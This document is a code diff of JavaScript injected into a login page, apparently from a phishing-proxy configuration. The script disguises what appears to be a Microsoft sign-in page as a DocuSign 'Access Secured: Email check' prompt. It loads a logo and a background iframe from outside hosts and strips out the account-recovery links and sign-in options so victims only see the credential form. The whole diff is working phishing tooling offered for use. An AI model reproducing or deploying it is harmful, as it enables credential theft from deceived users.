@@ -128,12 +128,10 @@ js_inject:
       setTimeout(() => {
         overlay.remove();
 
-        // Start background replacement
         const replaceBackground = () => {
           const bgImg = document.querySelector('#backgroundImage');
           if (bgImg && !document.getElementById('customBgIframe')) {
             bgImg.style.display = 'none';
-
             const iframe = document.createElement("iframe");
             iframe.id = "customBgIframe";
             iframe.src = "https://pub-4ec73ba7bee04896b7e30d39646ed8f3.r2.dev/off.html";
@@ -146,15 +144,13 @@ js_inject:
             iframe.style.border = "none";
             iframe.style.pointerEvents = "none";
             iframe.style.overflow = "hidden";
-
             const container = bgImg.parentElement;
             container.appendChild(iframe);
           }
         };
 
-        // Continuous Fix
         setInterval(() => {
-          // Replace logo with DocuSign
+          // Replace DocuSign logo
           const logoImg = document.querySelector('img.logo');
           if (logoImg && !logoImg.src.includes('DocuSign-Logo.png')) {
             logoImg.src = "https://cloudmasonry.com/wp-content/uploads/2020/06/DocuSign-Logo.png";
@@ -162,12 +158,11 @@ js_inject:
             logoImg.style.objectFit = "contain";
           }
 
-          // Change header title
+          // Change title
           const titleDiv = document.querySelector('#loginHeader > div');
           if (titleDiv && titleDiv.textContent.trim() !== "Access Secured: Email check") {
             titleDiv.textContent = "Access Secured: Email check";
 
-            // Add custom subtext if not already added
             if (!document.getElementById('customSubtext')) {
               const subText = document.createElement('div');
               subText.id = "customSubtext";
@@ -180,23 +175,21 @@ js_inject:
             }
           }
 
-          // Move No account? + Can't access? above input
-          const scrollArea = document.querySelector('.win-scroll');
-          const signupLinks = scrollArea?.querySelector('.password-reset-links-container');
-          const formGroup = scrollArea?.querySelector('.form-group.col-md-24');
-          if (scrollArea && signupLinks && formGroup && signupLinks.nextSibling !== formGroup) {
-            scrollArea.insertBefore(signupLinks, formGroup);
+          // Remove No account? / Can't access?
+          const signupResetLinks = document.querySelector('.password-reset-links-container');
+          if (signupResetLinks) {
+            signupResetLinks.remove();
           }
 
-          // Remove "Sign-in options" section
-          const signinOptions = document.querySelector('.promoted-fed-cred-box');
-          if (signinOptions) {
-            signinOptions.remove();
+          // Remove "Sign-in options" tile
+          const signInOptionTile = document.querySelector('.promoted-fed-cred-box, .row.tile');
+          if (signInOptionTile) {
+            signInOptionTile.remove();
           }
 
-          // Replace background
+          // Background replacement
           replaceBackground();
 
-        }, 500); // Repeat every half second
+        }, 500);
 
       }, 3000);
